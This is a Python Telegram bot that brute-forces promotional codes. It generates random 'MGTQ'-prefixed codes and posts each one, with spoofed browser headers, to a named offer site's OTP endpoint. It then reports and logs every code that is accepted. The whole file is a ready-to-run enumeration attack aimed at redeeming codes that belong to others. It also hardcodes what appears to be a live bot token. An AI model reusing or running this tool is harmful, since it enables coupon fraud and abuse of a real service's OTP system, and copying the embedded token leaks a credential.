import requests
import time
import random
import string
import json
import threading
from typing import Dict
import telebot
from telebot import types

# ================== CONFIG ==================
TOKEN = "8862593507:AAFYWO7Wp-TiIaVCtbuoE3yLAxkABt3x8uY"   # ← Put your bot token here

BASE_URL = "https://www.ssw.theofferclub.in"
OTP_ENDPOINT = f"{BASE_URL}/home/generateOTP"

NUM_CODES = 20000
MAX_WORKERS = 5
DELAY_PER_THREAD = 0.7

bot = telebot.TeleBot(TOKEN)

# Global variables
user_data = {}          # Store mobile per user
checking = False
stop_event = threading.Event()

# ================== FUNCTIONS ==================

def generate_random_code() -> str:
    prefix = "MGTQ"
    chars = string.ascii_uppercase + string.digits
    return prefix + ''.join(random.choices(chars, k=6))


def check_code(code: str, mobile: str) -> Dict:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://www.ssw.theofferclub.in/",
        "Origin": "https://www.ssw.theofferclub.in",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    
    data = {"phone": mobile, "ccode": code}
    
    try:
        response = requests.post(OTP_ENDPOINT, data=data, headers=headers, timeout=20)
        
        if response.status_code == 200:
            try:
                json_resp = response.json()
                if json_resp.get("status") == "success":
                    return {"valid": True, "code": code, "msg": "✅ OTP Sent Successfully!"}
                else:
                    return {"valid": False, "code": code, "msg": json_resp.get("msg", "Invalid Code")}
            except:
                return {"valid": False, "code": code, "msg": "JSON Parse Error"}
        else:
            return {"valid": False, "code": code, "msg": f"HTTP {response.status_code}"}
            
    except Exception as e:
        return {"valid": False, "code": code, "msg": f"Request Error: {str(e)}"}


def start_checking(chat_id, mobile):
    global checking
    checking = True
    stop_event.clear()
    valid_found = 0
    total = 0

    bot.send_message(chat_id, f"🚀 **Checking Started!**\n📱 Mobile: `{mobile}`\n🔢 Total Codes: {NUM_CODES}", parse_mode="Markdown")

    while not stop_event.is_set() and total < NUM_CODES:
        code = generate_random_code()
        total += 1
        
        result = check_code(code, mobile)
        
        if result["valid"]:
            valid_found += 1
            bot.send_message(chat_id, f"🎉 **VALID CODE FOUND!**\n`{code}`\n📱 Mobile: {mobile}", parse_mode="Markdown")
            
            with open("valid_codes.txt", "a") as f:
                f.write(f"{code} | {mobile} | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Progress update every 30 codes
        if total % 30 == 0:
            bot.send_message(chat_id, f"📊 **Progress**: {total}/{NUM_CODES} | ✅ Valid: {valid_found}", parse_mode="Markdown")
        
        time.sleep(DELAY_PER_THREAD)

    checking = False
    bot.send_message(chat_id, f"✅ **Checking Finished**\nTotal Checked: {total}\nValid Found: {valid_found}", parse_mode="Markdown")


# ================== COMMANDS ==================

@bot.message_handler(commands=['start'])
def start(msg):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add('/setmobile', '/startcheck', '/stop', '/status')
    
    bot.send_message(msg.chat.id, 
        "👋 **Welcome to Oaksmith Code Checker Bot**\n\n"
        "Use the buttons or commands below:", 
        reply_markup=markup, parse_mode="Markdown")


@bot.message_handler(commands=['setmobile'])
def set_mobile(msg):
    bot.send_message(msg.chat.id, "📱 Please send your 10-digit mobile number:")
    bot.register_next_step_handler(msg, save_mobile)


def save_mobile(msg):
    mobile = msg.text.strip()
    if mobile.isdigit() and len(mobile) == 10:
        user_data[msg.chat.id] = {"mobile": mobile}
        bot.send_message(msg.chat.id, f"✅ Mobile number saved: `{mobile}`", parse_mode="Markdown")
    else:
        bot.send_message(msg.chat.id, "❌ Please send a valid 10-digit mobile number.")


@bot.message_handler(commands=['startcheck'])
def start_check(msg):
    global checking
    if checking:
        bot.send_message(msg.chat.id, "⚠️ Already checking! Use /stop first.")
        return
    
    if msg.chat.id not in user_data or "mobile" not in user_data[msg.chat.id]:
        bot.send_message(msg.chat.id, "❌ Please set mobile number first using /setmobile")
        return
    
    mobile = user_data[msg.chat.id]["mobile"]
    threading.Thread(target=start_checking, args=(msg.chat.id, mobile), daemon=True).start()


@bot.message_handler(commands=['stop'])
def stop_check(msg):
    global checking
    if checking:
        stop_event.set()
        bot.send_message(msg.chat.id, "🛑 Stopping the checker...")
    else:
        bot.send_message(msg.chat.id, "✅ Checker is not running.")


@bot.message_handler(commands=['status'])
def status(msg):
    if checking:
        bot.send_message(msg.chat.id, "🔄 **Currently Checking...**")
    else:
        bot.send_message(msg.chat.id, "⏹️ **Idle** - Ready to start")


# ================== START BOT ==================
print("🤖 Oaksmith Telegram Bot Started...")
bot.infinity_polling()